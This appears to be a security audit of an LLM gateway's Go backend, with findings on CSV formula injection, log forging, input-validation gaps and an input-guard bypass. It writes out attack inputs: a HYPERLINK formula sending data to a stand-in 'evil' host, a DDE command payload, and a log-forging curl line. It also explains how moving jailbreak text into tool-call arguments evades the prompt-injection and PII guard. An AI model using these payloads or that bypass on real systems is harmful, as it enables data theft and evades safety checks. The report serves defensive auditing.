title: CSV export formula injection: gateway-controlled model / X-Request-ID columns are written unescaped into audit, token-stats and keyword CSVs that the admin console downloads for Excel
category: Injection (CSV formula / DDE) in exported artifacts
evidence: audit.go:99 `w := csv.NewWriter(&sb)` then audit.go:101-105 `w.Write([]string{r.RequestID, r.CreatedAt.Format(time.RFC3339), r.APIKeyLabel, r.Protocol,` / `r.ModelAlias, upstreamLabel(...), r.Status, strconv.FormatBool(r.Blocked), r.BlockReason})` — raw fields, no `=`/`+`/`-`/`@`/tab prefix neutralisation anywhere (grep of backend: no QuoteMeta/csv sanitiser; Go's csv.Writer only quotes, never escapes formulas). Same pattern at audit.go:180-181 (operation logs: `r.Operator, r.Action, r.Module, r.Target`), tokenstats.go:276-277 (`strconv.Itoa(int(r.id)), r.label,` — API-key name) and guard.go:138 (`w.Write([]string{r.Word, r.Category, r.MatchMode, r.Action, ...})`). Both poisoned columns are reachable by a plain gateway key: gateway.go:334 `ap.alias = cr.Model` is set before resolution, so an unknown-model 404 still persists the attacker string (gateway.go:315-317 `if shouldAuditCall(snap.General, ap.status)` + gateway.go:257 `if status != "ok" { return true }`), and gateway.go:84 `if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 {` puts an attacker-chosen request_id in the first CSV column. Delivery is a file download: frontend/src/api/client.ts:124-127 `responseType: 'blob'` → client.ts:141 `a.download = filename;`.
impact: One gateway call such as `{"model":"=HYPERLINK(\"http://evil/\"&A1)","messages":[]}` or header `X-Request-ID: @SUM(1+1)+cmd|'/C calc'!A0` writes a row that becomes an active formula the next time an admin clicks Export CSV (audit.go:108 `Content-Disposition: attachment; filename=call-logs.csv`). Because the data crosses a trust boundary (tenant-supplied string → privileged analyst's spreadsheet), the result is attacker-chosen formula execution in the admin's Excel: data exfiltration of adjacent cells to a remote host via WEBSERVICE/HYPERLINK/DDE prompts, i.e. workstation compromise from a low-privilege tenant. Excel Protected View dampens but does not remove this for HYPERLINK/WEBSERVICE-class formulas.
recommendation: Add one shared csvCell() helper used by every export writer: prefix any field whose first rune is = + - @ \t \r (or that contains a DDE pipe) with a single quote or a tab, and keep request_id/model truncation to their declared column widths before writing.
mitigations_checked: SQL layer is parameterised so the strings cannot reach SQLite as SQL; the SPA renders these fields as React children (no dangerouslySetInnerHTML/innerHTML/new RegExp anywhere in frontend/src) so there is no DOM XSS alternative sink; /metrics escapes label values (metrics/prom.go:43-45 promEsc). Only the CSV path is unprotected.

title: Prompt-injection and PII guard only inspects Message.Content: client tool-call arguments, function name and tool_call_id are forwarded to the upstream unscanned, unmasked and unlogged
evidence: The whole input scan is one line per message: gateway.go:382-385 `for i := range cr.Messages {` / `vd := guard.CheckInput(snap, cr.Messages[i].Content)` / `allFindings = append(allFindings, vd.Findings...)` / `cr.Messages[i].Content = vd.Text`. Canonical fields outside Content are never passed to the engine although they are forwarded verbatim: adapter.go:163-166 `for _, tc := range m.ToolCalls {` / `cm.ToolCalls = append(cm.ToolCalls, CanonicalToolCall{ID: tc.ID, Name: tc.Function.Name,` / `Arguments: tc.Function.Arguments})` (openai_chat), adapter.go:281-284 (responses `function_call` → `ToolCalls`, `function_call_output` → `ToolCallID`), adapter.go:393 `calls = append(calls, CanonicalToolCall{ID: b.ID, Name: b.Name, Arguments: string(b.Input)})` (anthropic tool_use). Those strings reach the model: adapter.go:525-526 `"function": map[string]any{"name": tc.Name, "arguments": tc.Arguments}` and adapter.go:639-640 `"name": tc.Name, "input": json.RawMessage(jsonOrObject(tc.Arguments))`; adapter.go:519 `msg["tool_call_id"] = m.ToolCallID` and adapter.go:520 `msg["name"] = m.Name` are also unsanitised. The audit copy has the same blind spot: adapter.go:429-441 `InputPlainText` concatenates only `m.Content` (so `ap.input` at gateway.go:398 never contains them), and guard.CheckInput returns early on empty text (engine.go:63 `if !snap.General.GuardEnabled || strings.TrimSpace(text) == "" {`), which is exactly the shape of an assistant tool-call-only message.
impact: Any API-key holder moves the payload from `content` into `tool_calls[0].function.arguments` (or `name`) and the keyword/PII/injection rules (REQ-008/009/010) are silently skipped: jailbreak text reaches the model and PII (phone/ID/card) reaches the upstream provider without masking — while the console shows the call as clean and blocked=0. The same channel hides it from the audit trail (input_text), so the bypass is undetectable after the fact. Only the OUTPUT path re-inspects tool calls (gateway.go:597-605/735-745), confirming the asymmetry is an oversight, not a design choice.
recommendation: Scan and mask every untrusted string that goes upstream: build the guard text from Content + Name + ToolCallID + each ToolCall.Name/Arguments (or scan per field), and apply CheckInput to the same set the adapter serialises.
mitigations_checked: Faithful-passthrough user decision covers tool arguments' *content* semantics, not the absence of the security scan; blocked requests still return 400 (gateway.go:399-407) when Content does match; regex rules are compiled once per reload (runtime/manager.go:280-321) so scanning more fields costs no recompilation; injection templates exist (guard.go:403-411) proving these rules are meant to stop exactly this.

title: Guard keyword bulk import has no row/byte caps and the batch endpoint bypasses regex validation entirely, so oversized imports and silently inert 'block' rules are accepted
evidence: guard.go:103-128 batchKeywords: `for _, it := range req.Items {` / `it.ID = 0` / `if err := s.db.Create(&it).Error; err == nil {` — no validateRule() call (contrast createKeyword guard.go:50-53 `if err := validateRule(req.MatchMode, req.Word); err != nil {`), no length/enum check on Word/Category/MatchMode/Action, no item-count limit; `Mode == "replace"` at guard.go:112-114 wipes the whole library in the same request. importKeywords guard.go:154-156 `r := csv.NewReader(...)` / `r.FieldsPerRecord = -1` / `records, err := r.ReadAll()` then the per-record Create loop at guard.go:162-190 — no cap on records, field length or total bytes. Nothing bounds the request body either: cmd/server/main.go registers only header/access-log middleware (main.go:95-118) and grep finds no http.MaxBytesReader/BodyLimit in the whole backend, so `csv` (guard.go:147-149 `CSV string `json:"csv"``) can be gigabytes; the SPA does not cap it either (frontend/src/pages/guard/Keywords.tsx:184-210 reads the whole File via FileReader and POSTs the text). Failure is silent: runtime/manager.go:282-287 `re, err := regexp.Compile("(?i)" + kw.Word)` / `if err != nil { loadErrs = append(...)` / `continue }` drops the rule from the snapshot while the row stays visible in the admin list (guard.go:40).
impact: Two concrete consequences. (a) Availability: a single import can insert an unbounded number of enabled regex/contains rules that are then re-scanned on EVERY gateway request (see injection-4) and recompiled on every 3s hot-reload poll, so one import permanently degrades the whole gateway; the same request also grows SQLite without limit. (b) Silent control failure: because batch import never validates the regex and never checks the Action enum, a typo such as action="Block" or an invalid PCRE-ism becomes a stored, listed, enabled rule that can never block — the operator believes the sensitive word is covered.
recommendation: Put a hard cap on items/records (e.g. 5 000) and on per-field length (255/512 per the model tags), validate Word/Category/MatchMode/Action enums in ALL three write paths (createKeyword, updateKeyword, batch+import), reject the request instead of `continue`-skipping, and wrap admin routes in http.MaxBytesReader.
mitigations_checked: Both endpoints sit behind s.AuthMiddleware() (routes.go:75-76) so only a JWT holder can invoke them; importKeywords does call validateRule per record (guard.go:181-184) — the gap is batch + caps; invalid regexes are reported in LoadErrors (manager.go:350-356) but that is only visible if someone opens /config-status.

title: Guard hot path re-lowercases the entire request text and the needle for every keyword: one 16 MiB message costs O(rules x bytes) allocations, and no per-message/per-request size limit exists
evidence: engine.go:197-205 `func matchKeyword(kw runtime.CompiledKeyword, text string) bool {` / `case "regex":` / `return kw.Re != nil && kw.Re.MatchString(text)` / `default: // contains` / `return strings.Contains(strings.ToLower(text), strings.ToLower(kw.Raw.Word))` — both `ToLower(text)` (whole message) and `ToLower(kw.Raw.Word)` are recomputed for every keyword in every request; the snapshot never pre-computes a lowercase needle (runtime/manager.go:280-291 stores only `Raw` and, for regex only, `Re`). The loop is per message and per rule: engine.go:73-83 `for _, kw := range snap.Keywords {` … `if !matchKeyword(kw, text) {`. Callers amplify it: gateway.go:382 `for i := range cr.Messages {` (message count unbounded) over bodies capped only at 16 MiB (gateway.go:322), and PII rules add a full-text scan each: engine.go:87 `loc := r.Re.FindAllStringIndex(text, -1)` plus engine.go:99 ReplaceAllString and engine.go:178-192 MaskForLog re-running every PII regex over the concatenated text. Nothing in settings bounds per-message or total prompt size (settings.General has no size field, settings/settings.go:15-28).
impact: Cost per request = O(messages x bytes x (keywords + pii_rules)) with the constant inflated by a full text copy per keyword. With the ~10-50 default contains-rules and one maximal 16 MiB message, a single request allocates hundreds of megabytes of transient lowercase copies; a scripted tenant sending large messages ties up CPU and forces constant GC pressure on the single process that also serves the admin API — cheap self-DoS from an ordinary API key, and it scales linearly with the rule count (see injection-3's missing caps).
recommendation: Lowercase each message once per request and pass the prepared string (or use case-insensitive matching via a precompiled lower needle) ; precompute `strings.ToLower(Word)` and the needle set in runtime.Manager.Reload; add a max-input-bytes and max-messages setting enforced before CheckInput.
mitigations_checked: Go's stdlib regexp is RE2, so no catastrophic backtracking exists in the regex branches (engine.go:200/87/99) — the exposure is pure linear-work multiplication, not ReDoS; guard failures degrade open to 'pass' (engine.go:66-70 recover) which limits crash risk but not CPU cost; `exact` mode avoids ToLower of the text (engine.go:202).

title: Operation-audit IP is taken from an unvalidated X-Forwarded-For header, defeating the TRUSTED_PROXIES=empty trust model and letting any caller forge the recorded source IP
evidence: server.go:108-115 `func clientIP(c *gin.Context) string {` / `if v := c.GetHeader("X-Forwarded-For"); v != "" {` / `if i := strings.IndexByte(v, ','); i > 0 {` / `return strings.TrimSpace(v[:i])` / `}` / `return c.ClientIP()` — the header wins unconditionally, with no check that the peer is a trusted proxy and no length/control-character cap. It is the only IP source for the audit row: server.go:94-97 `func (s *Server) recordOp(...) {` / `audit.LogOp(s.db, operatorOf(c), action, module, target, before, after, clientIP(c),` → internal/audit/audit.go:120-122 `Target: target, BeforeJSON: mj(before), AfterJSON: mj(after), IP: ip, Effective: effective,` (model.go:281 `IP string `gorm:"size:64"``). This is deliberately NOT gin's ClientIP(): main.go:90-94 `// 仅信任配置内的反向代理；默认空 → 不信任 X-Forwarded-For` … `engine.SetTrustedProxies(cfg.TrustedProxies)`, and TRUSTED_PROXIES defaults to empty (config.go:74). The gateway path shows the correct pattern for contrast: gateway.go:222 `if !rec.IPAllowed(c.ClientIP()) {`.
impact: Every privileged action recorded by REQ-003 (key/provider/keyword/quota/user changes, logins, backup restore, config rollback) carries an IP the caller chooses: `-H 'X-Forwarded-For: 10.0.0.5'` for a single op, or a rotating value to flood the column (SQLite ignores size:64). Incident response and insider-actor attribution built on /audit/operations (and its CSV export, which writes this column at audit.go:181) become untrustworthy, and an attacker can pin actions on a colleague's or the proxy's address. Unlike gateway-9, there is no fail-closed direction here — the field is simply attacker-written.
recommendation: Delete the custom helper and always use c.ClientIP() (gin already honours SetTrustedProxies), or gate the XFF branch on a trusted-proxy check plus net.ParseIP validation and length truncation before storing.
mitigations_checked: Gateway IP allowlist is safe because it uses c.ClientIP() with the trusted-proxy list (gateway.go:222 + main.go:92); no rate limiter keys on clientIP(), so the spoof does not affect throttling; login lockout is per username (auth.go:114-122), not per IP, so no lockout-bypass escalation — the impact is confined to audit-record integrity.

title: Unauthenticated access-log line forging: the decoded URL path is printed with %s, so percent-encoded newlines and ANSI escapes in the request path inject or corrupt log lines
evidence: main.go:106-118 logging middleware: `path := c.Request.URL.Path` (line 109) — the DECODED path — then main.go:116-117 `log.Printf("[access] %3d  %-6s %s  %s  %s",` / `c.Writer.Status(), c.Request.Method, path, time.Since(start), c.ClientIP())`. No control-character filtering exists anywhere (grep: no IsPrint/strconv.QuotedFormatString on log inputs), and the value reaches the log even for routes that 404, because the SPA fallback runs it (routes.go:173-195 `r.NoRoute(func(c *gin.Context) {` with the `/api/` `/v1/` prefix guard at :177). The project itself demonstrates the correct form in the gateway: gateway.go:341 `log.Printf("[gateway] model %q not configured; ...", cr.Model, stripped)` and gateway.go:352 use %q, which quotes and escapes newlines.
impact: `curl --path-as-is 'http://host/%0A%5Baccess%5D%20200%20%20GET%20%2Fapi%2Fadmin%2Fv1%2Fusers%20-%20127.0.0.1'` emits a genuine second line in stdout that is indistinguishable from a real request — an unauthenticated actor can fabricate, hide or reorder security events in the only record of unauthenticated traffic (404 probing, /metrics scraping, SPA fallbacks), and can inject raw ANSI/terminal escapes (e.g. `%1b[2J`, `%1b]0;title`) that corrupt or spoof what an operator sees in a terminal/journal viewer. Any log-to-ticket or log-to-SIEM pipeline that trusts the `[access] ` prefix is poisoned.
recommendation: Log c.Request.URL.EscapedPath() (or wrap every dynamic log field in strconv.Quote) so newlines/escapes cannot survive, and use %q consistently for attacker-controlled values as the gateway already does.
mitigations_checked: Raw CR/LF in the request line is impossible (net/http terminates the request line first), so this is injection of *decoded* bytes only; headers are safe (`c.ClientIP()`/`Method` are not attacker-free but Method is parsed as a token); the call_logs audit table is unaffected (separate finding gateway-1 covers that path); /healthz and /assets/* are skipped (main.go:110-115) but every other path is logged.

title: KV settings accept unbounded integers with zero validation: recovery_code_count turns a MFA bind into a fatal out-of-memory, max_connections/stream_chunk_threshold silently disable controls
category: Input validation / bounds checking (resource exhaustion + control disable)
evidence: settings.go:115-128 `func (s *Server) saveSecurity(c *gin.Context) {` / `var sec settings.Security` / `if err := c.ShouldBindJSON(&sec); err != nil {` … `settings.SaveKV(s.db, model.SetKeySecurity, sec)` — the only check anywhere in the file (`ShouldBindJSON`), no bounds on any numeric field; saveGeneral (settings.go:24-38), saveFailover (:48-61), saveOutput (:71-84) are identical. The consumed values: settings/settings.go:82-83 `RecoveryCodeCount int` / `GraceDays int`, :19 `MaxConnections int`, :57 `StreamChunkThreshold int`. The sink: admin/mfa.go:40-52 `func generateRecoveryCodes(n int) ([]string, []string) {` / `if n < 1 {` / `n = 10` / `}` / `plain := make([]string, n)` / `hashed := make([]string, n)` / `for i := 0; i < n; i++ {` / `p := crypto.RandomHex(8)` — upper bound never checked; reached from auth.go:240-248 `sec := s.securitySettings()` / `plain, hashed := generateRecoveryCodes(sec.RecoveryCodeCount)` … `s.ok(c, gin.H{"recovery_codes": plain})`. Control-disabling consumers: gateway.go:195 `if int64(snap.General.MaxConnections) > 0 && s.mx.Conns() >= int64(snap.General.MaxConnections) {` (0 or negative disables the gate) and gateway.go:632-635 `threshold := snap.Output.StreamChunkThreshold` / `if threshold < 64 { threshold = 256 }` (only a lower clamp, so a huge value means the mid-stream output guard at gateway.go:699-709 never fires before content is already delivered).
impact: PUT /api/admin/v1/settings/security {"recovery_code_count":100000000} then POST /account/mfa/enable makes a 100 M-element slice plus 100 M crypto/rand draws plus a multi-GB JSON response: the Go runtime raises an unrecoverable 'out of memory' fatal error, which gin.Recovery (main.go:95) cannot catch — the single process dies, so the gateway, admin API, audit writer and hot-reload loop all stop at once. A stolen/forwarded admin token therefore converts into immediate total outage, and a smaller value (e.g. 200 000) hangs the request for minutes behind the SQLite single-writer connection. max_connections<=0 and a huge stream_chunk_threshold are silent one-request disablements of the connection cap and of streaming output filtering.
recommendation: Validate every KV numeric on save (positive, and per-field maxima: recovery_code_count 1-100, grace_days 0-365, max_connections 1-100000, default_timeout_seconds 1-3600, stream_chunk_threshold 64-1MB, audit_retention_days 1-3650, call_audit_sampling 1-10000) and clamp again at consumption instead of only '< 64'.
mitigations_checked: AuditRetentionDays<=0 falls back to 90 (audit/audit.go:97-101) and DefaultTimeoutSeconds<=0 falls back to 120s (gateway.go:498-501) — those two are benign; HotReloadSeconds<1 falls back to 3s (manager.go:169-175); CallAuditSampling<=1 means 'log everything' (gateway.go:263-266) so no silent log loss; all these routes require a valid JWT (routes.go:124-127).

title: importProviderModels ingests an unvalidated, uncapped model-name list from an external provider response and merges the provider into EXISTING aliases, so a rogue/MITM /models reply poisons routing
category: Input validation of externally-supplied data / trust boundary
evidence: providers.go:300-307 accepts `Models []string `json:"models"`` with only `if err := c.ShouldBindJSON(&req); err != nil || len(req.Models) == 0 {` — no count cap, no per-name length/charset check (model.go:120 `Alias string `gorm:"uniqueIndex;size:64"`` — the size tag is not enforced by SQLite), no cross-check that the name was actually returned by the provider. providers.go:310-331 the merge branch: `if err := tx.Where("alias = ?", name).First(&a).Error; err == nil {` … `if err := tx.Create(&model.AliasUpstream{AliasID: a.ID, ProviderID: p.ID,` / `UpstreamModel: name, Weight: 1}).Error; err != nil {` — i.e. an already-existing alias (possibly belonging to another provider) gains this provider as a weighted upstream; providers.go:334 `a = model.ModelAlias{Alias: name, Enabled: req.Enabled}` creates it enabled when the operator ticks the box. The names originate from an unauthenticated remote reply: providers.go:192 `body, _ := io.ReadAll(io.LimitReader(resp.Body, 64<<10))` → parseModelList (providers.go:256-289) over base_url that was never scheme/IP-validated (providers.go:56 checks only `req.BaseURL == ""`), and the string later reaches the gateway hot path and CSV exports (see injection-1, injection-5).
impact: A third-party reseller (or anyone able to answer that HTTP call — base_url is not required to be https) returns `{"data":[{"id":"gpt-4"}, …]}`; the operator's 'import models' click then attaches the attacker's provider+key to the tenant-wide gpt-4 alias, and SWRR starts sending real user prompts and provider credentials to the attacker endpoint (adapter.go:555-560 posts up.BaseURL with the decrypted key). Unbounded list length also lets one request create tens of thousands of aliases, each re-materialised on every 3s hot reload (manager.go:226-263) and each becoming a /metrics label + audit column.
recommendation: Persist the tested provider model list server-side (per provider id) and reject any import entry not present in that stored set; enforce alias/upstream_model charset and length (`^[A-Za-z0-9._:\-]{1,64}$`), cap batch size, and require an explicit confirmation when an entry would merge into an alias owned by a different provider.
mitigations_checked: Route is admin-JWT only (routes.go:60); SQL is parameterised; duplicate (provider, model) pairs are skipped (providers.go:319-323) and the whole import is one transaction (:309); enabled-by-default is only when `req.Enabled` is set (:334); no wildcard/glob semantics exist for alias names so a poisoned name cannot shadow prefix-matched routing.

title: PII mask replacement string is used as a regexp expansion template without validation, so a '$' in the configured replacement silently disables masking
evidence: engine.go:91-99 `repl := r.Raw.Replacement` / `if repl == "" {` / `repl = "[REDACTED]"` / `}` … `case "mask":` / `vd.Text = r.Re.ReplaceAllString(vd.Text, repl)` — Go's ReplaceAllString expands `$name`/`$1`/`$0` in the replacement; the value comes straight from the request body with no check (admin/guard.go:240 validates only `validateRegex(req.Pattern)`, never Replacement; :270-271 `r.Name, r.Category, r.Pattern, r.Replacement, r.Action, r.Enabled =` copies it on update; model.go:157 `Replacement string `gorm:"size:64"`` is unenforced on SQLite). The identical pattern repeats on the output filter (engine.go:144-150) and on the audit-masking copy (engine.go:181-188 `out = r.Re.ReplaceAllString(out, repl)`), and the templates offered to operators use no `$`, so the trap is invisible in normal use (guard.go:294-303).
impact: A replacement of `$0` (or a stray `$1` inside a literal like `编号$1`) makes the rule echo the matched secret instead of redacting it: the PII is forwarded verbatim to the upstream provider (gateway.go:385 assigns the 'masked' text to the message that is sent) AND remains verbatim in call_logs.input_text because MaskForLog uses the same broken replacement — the console and CSV then show a rule that 'ran' while it leaked. A replacement referencing a group the pattern does not define expands to the empty string, silently truncating surrounding text and corrupting prompts. Nothing in config-status (which only reports load errors, manager.go:349-356) surfaces this.
recommendation: Validate Replacement on create/update — reject or escape any '$' not intended as an expansion (use regexp.QuoteMeta-style escaping, or require a `$$` literal), bound its length, and unit-test that a mask rule never emits the original match.
mitigations_checked: No injection into SQL/shell occurs here; the pattern itself is RE2-compiled so no ReDoS; the block/warn branches (engine.go:100-105) do not touch Replacement; only mask rules are affected, and the default `[REDACTED]` fallback is safe.

title: List endpoints take unbounded page/offset and pass raw filter text into LIKE patterns without escaping the % and _ metacharacters
evidence: server.go:81-91 `func parsePage(c *gin.Context) (int, int) {` / `page := paramInt(c, "page", 1)` / `if page < 1 { page = 1 }` / `size := paramInt(c, "page_size", 20)` / `if size < 1 || size > 500 { size = 20 }` — page has no upper bound (paramInt, server.go:72-79, accepts any int), and it is fed straight into SQL: audit.go:55 `q.Order("created_at DESC").Offset((page - 1) * size).Limit(size).Find(&rows)`, and the same expression in apikeys.go:23, guard.go:40/230/336, models.go:42, providers.go:43, quota.go:26/166, backup.go:21, users.go:24. Filter text is concatenated around LIKE: audit.go:127 `q = q.Where("model_alias LIKE ?", "%"+v+"%")`, audit.go:136 (category), tokenstats.go:127 `q = q.Where("model_alias LIKE ?", "%"+p.modelAlias+"%")`, guard.go:26 (word), :225 (name), :331, models.go:37, apikeys.go:18, providers.go:38.
impact: No SQL injection — every value is a bound parameter and all Order/Select/Group strings are compile-time constants (verified: the only concatenations are the fixed tokenSumSelect/dateBucketExpr at tokenstats.go:144/193/208, with granularity restricted to hour|day at :111-113). The real gaps are (a) a huge `page` turns a list query into a full-index scan-then-discard on a table an ordinary tenant can bloat at will, so /audit/calls?page=9000000 is a cheap repeated slowdown of the shared SQLite connection; and (b) `%`/`_` in filters silently widen the match set (a search for `%` returns everything), so an operator's 'filter then export' step can ship far more rows than intended — the export itself is unfiltered-shaped (audit.go:97 `Limit(10000)`) and case/underscore-sensitive LIKE makes 'exact model' filtering unreliable.
recommendation: Cap page against the counted total (or use keyset pagination) and reject page*size beyond a maximum window; escape LIKE metacharacters (`%`, `_`, `\`) in all filter parameters, ideally with ESCAPE '\'.
mitigations_checked: page_size is bounded to 500; exports are capped at 10000 rows (audit.go:97/175); `blocked`/`enabled` filters coerce to booleans (audit.go:133, guard.go:35) rather than accepting arbitrary SQL; parseTimeQ rejects unparseable timestamps entirely (audit.go:26-39) so no time-string reaches SQL as text.

title: Backup/config restore accepts an arbitrary JSON bundle with no per-table caps, no rule or enum validation and no allowlist on settings keys
category: Input validation / integrity of privileged bulk write
evidence: backup.go:56-85 restoreBackup takes `Content string `json:"content"`` (or an ID) and calls runtime.LoadBundleJSON(data) (backup.go:76), which is a plain decode with no schema check: runtime/bundle.go:171-179 `if err := json.Unmarshal([]byte(data), &b); err != nil {`. RestoreBundle then deletes and re-inserts whole tables (bundle.go:81-89 `for _, table := range []any{ &model.Provider{}, … } { if err := tx.Where("1 = 1").Delete(table).Error`), bulk-creates whatever it is handed (:90-135 `tx.Create(&b.Keywords)` etc. — no length/enum/cap validation, unlike createKeyword at guard.go:50) and finally writes arbitrary KV keys: bundle.go:136-140 `for k, v := range b.Settings {` / `if err := tx.Save(&model.SystemSetting{Key: k, ValueJSON: v}).Error; err != nil {`. The export path skips only config_meta (bundle.go:61-64), so restore has no key allowlist either, and Rollback replays an unvalidated stored snapshot (bundle.go:156-163).
impact: One request can (a) replace every guard rule with inert variants (unvalidated Action/MatchMode, invalid regex silently skipped by manager.go:282-287) and every provider with attacker URLs, which the operator then trusts because the console lists them; (b) set arbitrary system_settings values, including a `security` document that disables global MFA (settings.Security.MFAEnabled at :80) or a huge `recovery_code_count` (see injection-7); (c) insert unbounded rows/strings (no MaxBytesReader on the route) that reappear as formulas in exports (injection-1). Everything is gated behind an admin JWT, so this is integrity/defense-in-depth rather than unauth abuse — but it is the one path that bypasses every per-endpoint validation the CRUD handlers do have.
recommendation: Schema-validate a decoded bundle before touching the DB: allowlist settings keys, run validateRule/enum/length checks on each keyword/PII/injection/provider row, cap collection sizes, and record a hash + operator in the op-log so restores are attributable.
mitigations_checked: Restore is transactional (bundle.go:80), so a DB error rolls back; provider APIKeyEnc values stay ciphertext-shaped and are only decrypted in memory (manager.go:212-222); routes.go:147 requires AuthMiddleware; the download endpoint's filename is server-generated (backup.go:33) and Go's net/http drops CR/LF from header values, so no response splitting from backup.go:52.

title: Token counting on the request path uses a backtracking regex engine (dlclark/regexp2 via tiktoken-go), the one non-RE2 regex reachable from gateway traffic, with no deadline or size cap
category: Input validation / dependency with super-linear regex behaviour
evidence: tokens.go:45-47 `Init()` / `if encErr == nil && enc != nil {` / `return len(enc.EncodeOrdinary(text))` — pkoukk/tiktoken-go performs BPE splitting with github.com/dlclark/regexp2, which is in the module graph precisely for it: go.mod:29 `github.com/dlclark/regexp2 v1.10.0 // indirect`. regexp2 is a backtracking engine with no match-time or step limit (unlike Go's RE2, see engine.go's guards). It is reached per gateway request: gateway.go:593 `usage := estimateUsage(cr.Usage, ap.input, cr.Content)` and gateway.go:755 `usage = estimateUsage(usage, ap.input, acc.String())` → gateway.go:809-816 `func estimateUsage(...)` / `u.Prompt = tokens.Count(input)` / `u.Completion = tokens.Count(output)` — with the streamed accumulator `acc` never size-capped (gateway.go:637-718, only per-line 4 MB at :640) and WriteTimeout=0 by design.
impact: Honest scoping: the attacker-controlled input side is bounded by guard.MaskForLog's 4000-byte truncation (engine.go:189-191), so a classic ReDoS from a tenant prompt is not demonstrated. The residual exposure is that per-request CPU on the gateway hot path is spent inside a non-linear-time regex engine on arbitrarily large text (up to 16 MB buffered upstream content, or unbounded streamed content), with no timeout, no context and no maximum length — so a slow/concurrent tokenizer or a hostile upstream can pin request goroutines on CPU, and any future call site that drops the 4000-byte mask loses the only bound. The mitigation cost of bounding it is trivial.
recommendation: Prefer the already-present heuristic when text exceeds a threshold (tokens.Estimate, tokens.go:53-64) — e.g. count exactly only below 64 KB — cap the streamed accumulator, and add a hard wall-clock budget around Count() so a tokenizer stall cannot outlive the request.
mitigations_checked: All guard-rule and PII regexes use stdlib regexp (RE2) — verified the only compile sites at admin/guard.go:426 and runtime/manager.go:283/298/313, no MustCompile on user input, and no PCRE/regexp2 import in internal/guard; Init() is a sync.Once so the BPE vocabulary is loaded once, not per request (tokens.go:25-30); /v1/messages/count_tokens deliberately estimates instead of tokenizing (gateway.go:108-109 `n := len(cr.InputPlainText())`).
